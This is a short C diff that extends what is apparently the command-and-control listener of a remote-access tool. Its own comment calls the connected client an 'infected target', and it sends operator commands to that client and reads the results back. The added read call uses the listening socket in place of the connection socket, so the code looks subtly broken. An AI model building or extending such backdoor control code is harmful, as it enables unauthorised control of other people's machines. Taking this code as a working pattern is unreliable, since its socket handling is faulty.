@@ -11,6 +11,7 @@ int fd; //socket identifier (file descripter)
 int conn; //connection identifier (connection file descripter)
 char message[100] = ""; //array to store messages
 int valread;
+char output[100] = ""; //array to gather output from infected target
 
 int startserv(int port){
   
@@ -31,7 +32,7 @@ int startserv(int port){
 
   listen(fd, 5); //Listen for client connections. Maximum 5 connections
 
-  printf("Listener started...\n");
+  printf("Listener started on port %i...\n", port);
 
   while(conn = accept(fd, (struct sockaddr *)NULL, NULL)) {
       int pid;
@@ -44,14 +45,16 @@ int startserv(int port){
           fgets(message, 100, stdin);
           fflush(stdout);
           send(conn, message, strlen(message), 0);
-        
-        }
-        /*
-        while (recv(conn, message, 100, 0) > 0) {
-          printf("Message Received: %s\n", message);
-          strcpy(message, "");
-        }*/
+          valread = read(fd, output, 100);
 
+          if(valread > 0){
+
+            printf("%s\n", output);
+            printf("Outputtime\n");
+          }
+
+        }
+        
       }
     }
   
